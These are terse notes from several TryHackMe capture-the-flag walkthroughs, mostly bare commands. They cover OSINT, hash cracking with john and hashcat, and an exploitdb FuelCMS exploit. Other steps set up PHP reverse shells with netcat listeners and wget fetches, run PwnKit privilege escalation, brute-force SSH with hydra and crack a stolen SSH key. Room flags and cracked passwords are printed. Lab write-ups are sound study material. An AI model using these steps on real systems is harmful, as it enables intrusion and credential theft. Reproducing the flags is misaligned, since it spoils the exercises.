# OhSINT
tryhackme ohsint walkthrough
## Download the picture.
## Getting information using the downloaded picture.
Download exiftool from
https://exiftool.org/

exiftool WindowsXP_1551719014755.jpg
OWoodflint
wigle.net
B4:5D:50:AA:86:41
cat
London
UnileverWiFi
OWoodflint@gmail.com
Github
New York
pennYDr0pper.!


# Crack the hash walkthrough
type check
https://hashes.com/en/tools/hash_identifier

value check on
https://crackstation.net/

john --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --format=bcrypt hash4.txt

# download hashcat format
./hashcat -m 3200 -D 2 hash4.txt example.dict

bleh

https://hashcat.net/hashcat/

john --wordlist=rockyou.txt --format=sha512crypt hash8.txt
hashcat -m 1800 -D 2 hash8.txt example.dict
./hashcat -m 1800 -a 3 hash8.txt ./masks/rockyou-1-60.hcmask

hashcat -m 160 -D 2 hash9.txt example.dict
./hashcat -m 160 -a 3 hash9.txt ./masks/8char-1l-1u-1d-1s-compliant.hcmask
./hashcat -m 160 -a 3 hash9.txt ./masks/rockyou-1-60.hcmask

# Anonforce
tryhackme Anonforce walkthrough
nmap -sV -vv Shown in 0min 57s
ftp anonymous@10.10.128.148
cat user.txt
606083fd33beb1284fc51f411a706af8

cd /notread
gpg2john private.asc > privatejohn
john privatejohn
xbox360
gpg --import private.asc
gpg --decrypt backup.pgp

echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_hash.txt
john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hikari
ssh root@10.10.128.148
cat /root/root.txt
f706456440c7af4187810c31c6cebdce

# Ignite
tryhackme Ignite walkthrough
qiita.com
nmap -sV -vv 10.10.161.86
gobuster dir -u http://10.10.161.86 -w /usr/share/wordlists/dirb/common.txt

http://10.10.161.86/fuel
admin admin
searchsploit fuelCMS
47138.py
python3 fuel_exploit.py -u http://10.10.161.86
whoami
cat fuel/application/config/database.php
nc -lnvp 4444

python /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://10.10.161.86
cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585059b

python -m http.server 8000
/var/www/html/php-reverse-shell.php
wget http://10.10.161.86:8000/php-reverse-shell.php
nc -lvnp 1234
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l
find / -user root -perm -4000 2>&1 | grep -v -e "Permission denied" -e "No such file or directory"
python -m http.server 8000
wget http://10.10.161.86:8000/linpeas.sh
chmod +x linpeas.sh
 /bin/sh linpeas.sh

git clone https://github.com/ly4k/PwnKit.git
python -m http.server 8000
wget -r http://10.6.55.144:8000/PwnKit/
chmod +x ./PwnKit
./PwnKit '/bin/sh -i'

 cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d

# Basic Pentesting
tryhackme Basic Pentesting walkthrough
## Deploy the machine
10.10.163.180
Download openvpn configuration file to connect with VPN to machines in TryHackMe.
https://tryhackme.com/access?o=vpn
openvpn 1.ovpn
ping 10.10.163.180 -c 4
nmap -A -T4 -p- 10.10.163.180
gobuster dir -u http://10.10.163.180/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
development
enum4linux 10.10.163.180
jan
smbclient //10.10.163.180/Anonymous
get staff.txt
cat staff.txt
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.163.180 ssh
armando
ssh
ssh jan@10.10.163.180
cd /home && ls
kay

find / -name "id_rsa"
cd /home/kay && ls
ls -al
cd /home/kay/.ssh && ls -al
cat id_rsa
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
beeswax
ssh -i id_rsa kay@10.10.163.180

cat pass.bak
sudo su
cd /root && ls
cat flag.txt

# Fowsniff CTF
tryhackme Fowsniff CTF walkthrough
10.10.17.108
nmap -Pn -A 10.10.17.108
gobuster dir -u http://10.10.17.108 -w /usr/share/dirb/wordlists/common.txt
